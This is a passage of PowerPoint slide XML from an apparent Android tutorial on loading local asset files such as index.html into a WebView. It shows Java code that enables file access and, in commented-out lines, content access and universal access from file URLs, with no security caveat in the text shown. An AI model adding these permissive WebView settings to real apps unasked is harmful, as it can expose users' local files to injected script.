          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4148919" y="2653498"/>
            <a:ext cx="5650173" cy="923330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>To be able to load other app internal files, the WebView </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>WebSettings</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> have to be changed: </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="TextBox 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C032D793-0D24-46D9-C759-13732E90038C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4544704" y="3576828"/>
            <a:ext cx="7765223" cy="2289666"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" rtl="0" fontAlgn="base">
              <a:lnSpc>
                <a:spcPts val="1466"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>WebView </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>webView</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>findViewById</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>R.id.webView</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>); </a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Segoe UI" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l" rtl="0" fontAlgn="base">
              <a:lnSpc>
                <a:spcPts val="1466"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>webView.getSettings</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>()</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" b="1" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>setAllowFileAccess</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>(true);</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Segoe UI" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l" rtl="0" fontAlgn="base">
              <a:lnSpc>
                <a:spcPts val="1466"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>//</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>webView.getSettings</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>().</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" b="1" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent3">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>setAllowContentAccess</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent3">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>(true);</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent3">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent3">
                  <a:lumMod val="75000"/>
                </a:schemeClr>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Segoe UI" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l" rtl="0" fontAlgn="base">
              <a:lnSpc>
                <a:spcPts val="1466"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>//</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>webView.getSettings</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>().</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" b="1" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent5">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>setAllowFileAccessFromFileURLs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent5">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>(true);</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent5">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent5">
                  <a:lumMod val="75000"/>
                </a:schemeClr>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Segoe UI" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="l" rtl="0" fontAlgn="base">
              <a:lnSpc>
                <a:spcPts val="1466"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>//</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>webView.getSettings</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>().</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" b="1" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>setAllowUniversalAccessFromFileURLs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>(true);</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1800" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" b="0" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Segoe UI" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="TextBox 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2550355D-167B-405E-2C83-B6477D537580}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3619081" y="600144"/>
            <a:ext cx="3068392" cy="830997"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="4800" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:cs typeface="Aharoni" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>WebView</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0">
              <a:cs typeface="Aharoni" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="A blue background with white text&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CAE0FB5B-E19E-48A4-13DE-59448AAC6485}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10881558" y="0"/>
            <a:ext cx="1310441" cy="584200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1803397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035AB-85A6-43BF-94C5-8273371325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511072F-CA02-F4B4-3CC0-E8EE72EB82EE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1999396" y="616858"/>
            <a:ext cx="7028597" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="3200" b="1" dirty="0"/>
              <a:t>Loading Local Files Using WebView</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0">
              <a:cs typeface="Aharoni" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="TextBox 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F9480E7C-AD0D-ABF1-5CE3-DB8713504911}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3698543" y="4858603"/>
            <a:ext cx="3630305" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="TextBox 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1404CECD-8F22-3F23-A891-2E19D7C13809}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="388960" y="1916519"/>
            <a:ext cx="5274861" cy="4093428"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
              <a:t>Android apps can include a special folder called assets.  This folder contains </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0"/>
              <a:t>static files</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
              <a:t> like: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:endParaRPr lang="en-GB" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750" fontAlgn="base">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.htm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
              <a:t>l files </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750" fontAlgn="base">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:rPr>
              <a:t>css</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
              <a:t> stylesheets </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750" fontAlgn="base">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:rPr>
              <a:t>js</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
              <a:t>JavaScript files </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750" fontAlgn="base">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
              <a:t>Images, etc. </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-GB" sz="2000" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-GB" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="TextBox 11">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{35423FFF-FA49-F632-504E-00DA1EDE2CD6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5916304" y="1916519"/>
            <a:ext cx="5274861" cy="3539430"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" sz="2800" b="1" dirty="0"/>
              <a:t>🏗 Structure:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" sz="2800" dirty="0"/>
              <a:t>In your Android project: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" sz="2800" dirty="0"/>
              <a:t>app/ </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" sz="2800" dirty="0"/>
              <a:t> └── </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2800" dirty="0" err="1"/>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2800" dirty="0"/>
              <a:t>/ </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" sz="2800" dirty="0"/>
              <a:t>      └── main/ </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" sz="2800" dirty="0"/>
              <a:t>           └── assets/ </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-GB" sz="2800" dirty="0"/>
              <a:t>                └── </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2800" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:rPr>
              <a:t>index.html</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="TextBox 12">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5F0F57F7-4BD1-9D6D-8BA2-073FE1C35013}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="129724" y="5970780"/>
            <a:ext cx="12062276" cy="400110"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
